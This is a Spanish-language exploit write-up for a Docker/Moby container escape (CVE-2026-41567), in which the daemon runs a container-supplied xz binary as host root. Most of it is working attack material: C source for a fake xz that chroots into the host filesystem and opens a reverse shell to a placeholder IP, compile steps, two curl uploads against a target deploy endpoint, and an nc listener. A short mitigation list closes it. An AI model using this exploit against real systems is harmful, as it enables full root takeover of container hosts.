# Escape de Contenedor — Docker Archive Binary Hijack (CVE-2026-41567)

## Descripción

Vulnerabilidad en Docker/Moby (`< 29.5.1`) clasificada como **CWE-427 (Uncontrolled Search Path Element)**. Cuando se sube un archivo comprimido a un contenedor vía `PUT /containers/{id}/archive` (o `docker cp -`), el daemon **resuelve el binario de descompresión (`xz`, `unpigz`) desde el sistema de archivos del contenedor en vez del host**, y lo ejecuta con sus propios privilegios: root del host, con capacidades sin restringir.

Formatos afectados: `xz`, `unpigz`. Los que usan implementaciones puras en Go (`bzip2`, `zstd`, `gzip` nativo sin `unpigz`) **no** son vulnerables.

---
## Por qué funciona — el fallo de confianza

El daemon de Docker (`dockerd`) **corre en el host como root**, no dentro de ningún contenedor. Cuando necesita descomprimir un archivo subido, en vez de usar su propia herramienta de confianza (fuera del alcance de cualquier contenedor), **va a buscar el binario dentro del propio contenedor** al que se le sube el archivo.

Un contenedor es territorio potencialmente controlado por el usuario/atacante (puede tener shell dentro, o puede subir contenido vía la propia aplicación). Si puedes sobrescribir el binario `xz` **dentro** del contenedor, el daemon lo ejecutará igualmente — pero con **sus** privilegios de root del host, no con los privilegios limitados del contenedor.

Analogía: un empleado de un banco que, en vez de usar sus propias herramientas de confianza, coge las que encuentra en la sala de visitas (donde cualquiera puede dejar algo) para abrir un paquete — y las usa con la autoridad de empleado del banco.

> Lo correcto sería que el daemon usara siempre su propio binario del host. El bug es justo lo contrario: coge la herramienta del sitio no confiable (contenedor) y la ejecuta con el poder del sitio confiable (host).

---
## Requisitos para explotarlo

- Poder subir/reemplazar el binario `xz`/`unpigz` dentro del contenedor (normalmente el usuario sin privilegios **no** tiene permiso de escritura directa sobre `/usr/bin/xz` — hace falta un canal que escriba ahí como root, como un endpoint de subida de archivos que internamente llame a la API de archivos de Docker).
- Poder disparar después una subida comprimida (`.tar.xz` o `.tar.gz` con `unpigz`) hacia ese mismo contenedor, para forzar al daemon a invocar el binario ya sustituido.

---
## Construcción del payload — escapando al host

El binario que plantas, cuando lo ejecuta el daemon, nace como hijo de `dockerd` — es decir, **hereda el namespace de PID del host**, no el del contenedor. Eso significa que `/proc/1/root/` ya no apunta al PID 1 del contenedor, sino al **PID 1 real del host** (su `init`/`systemd`), y esa ruta especial de `/proc` te deja ver el filesystem raíz tal como lo ve ese proceso.

```c
// xz.c — sustituye al binario legítimo de descompresión
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);  // vista fresca y correcta de /proc
    chroot("/proc/1/root");                   // pivota al filesystem real del host
    chdir("/");
    execl("/bin/bash", "bash", "-c",
          "bash -i >& /dev/tcp/TU_IP/4444 0>&1", NULL);
    return 1;
}
```

- `mount()` necesita `CAP_SYS_ADMIN`, `chroot()` necesita `CAP_SYS_CHROOT` — ambas las hereda el proceso automáticamente porque lo lanzó el daemon con todo su conjunto de privilegios.
- Tras el `chroot`, cualquier comando posterior (la reverse shell) opera sobre el **disco real del host**, no del contenedor.

```bash
gcc -static -o xz xz.c   # estático, para no depender de librerías del entorno donde se ejecute
```

### Empaquetado y subida (dos fases)

**Fase 1 — plantar el binario**, usando un `.tar` **sin comprimir** (así no hace falta descomprimir nada todavía, evitando el problema de qué binario se usaría para esta primera subida):

```bash
mkdir -p pkg/usr/bin
cp xz pkg/usr/bin/xz
cd pkg && tar cf ../plant.tar usr/bin/xz   # la ruta relativa dentro del tar importa
cd ..

curl -u USUARIO:PASSWORD \
  -F 'archive=@plant.tar' \
  -F 'workspace=/' \
  http://TARGET/deploy
```

`workspace=/` es crítico: el resultado final de la extracción es `workspace + ruta_relativa_del_tar` = `/usr/bin/xz`, pisando el binario real. Si se usara otra ruta de destino, el binario trampeado no estaría donde el daemon lo busca.

**Fase 2 — disparar el ataque**, con cualquier `.tar.xz` válido (el contenido no importa, solo que fuerce la descompresión):

```bash
nc -lvnp 4444

echo x > t && tar cf - t | xz > trigger.tar.xz
curl -u USUARIO:PASSWORD \
  -F 'archive=@trigger.tar.xz' \
  -F 'workspace=/workspace' \
  http://TARGET/deploy
```

El daemon detecta la compresión `xz`, resuelve `/usr/bin/xz` desde el overlay del contenedor (ya sustituido), y lo ejecuta como root del host.

---
## Identificación rápida

```bash
# Versión del motor expuesta normalmente en paneles de estado / API
curl TARGET/status    # o equivalente del panel
# Docker < 29.5.1 → candidato a CVE-2026-41567
```

---
## Mitigación

- Actualizar a Docker/Moby ≥ 29.5.1 (o moby v2 ≥ 2.0.0-beta.14).
- No ejecutar contenedores de imágenes no confiables.
- Evitar exponer `PUT /containers/{id}/archive` a usuarios no confiables sin control adicional.
